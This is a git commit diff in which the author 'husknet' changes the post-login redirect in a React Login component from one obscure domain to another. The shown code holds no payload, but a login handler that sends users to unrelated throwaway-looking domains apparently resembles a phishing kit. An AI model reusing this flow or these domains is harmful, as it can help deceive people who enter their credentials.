016f409d273a756599ce4340aa898693428f5e7c
husknet <127146284+husknet@users.noreply.github.com>
2025-05-06 12:33:00 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://luke.nestconche.shop/';
+      window.location.href = 'https://luke.lccbss.com/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
